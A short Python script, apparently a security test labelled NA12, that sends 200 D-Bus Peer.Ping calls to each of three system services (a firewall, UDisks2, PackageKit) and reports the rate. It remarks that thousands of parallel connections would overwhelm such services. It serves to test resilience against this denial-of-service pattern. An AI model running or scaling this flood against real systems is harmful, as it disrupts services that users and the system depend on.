#!/usr/bin/env python3
"""NA12: Peer.Ping flood DoS test"""
import dbus, time, sys

bus = dbus.SystemBus()

# Ping 目标服务（不是 dbus-daemon 本身）
targets = [
    ("com.example.Firewall1", "/com/example/Firewall1"),
    ("org.freedesktop.UDisks2", "/org/freedesktop/UDisks2/block_devices/sda"),
    ("org.freedesktop.PackageKit", "/org/freedesktop/PackageKit"),
]

for dest, path in targets:
    try:
        proxy = bus.get_object(dest, path)
        peer = dbus.Interface(proxy, "org.freedesktop.DBus.Peer")
        start = time.time()
        count = 0
        for i in range(200):
            peer.Ping()
            count += 1
        elapsed = time.time() - start
        print(f"[{dest}] {count} Pings in {elapsed:.3f}s ({count/elapsed:.0f}/s)")
    except Exception as e:
        print(f"[{dest}] Error: {e}")

print("\nIn a real attack, thousands of parallel connections would overwhelm services")
print("Each Ping forces the service to process a METHOD_CALL + send a reply")
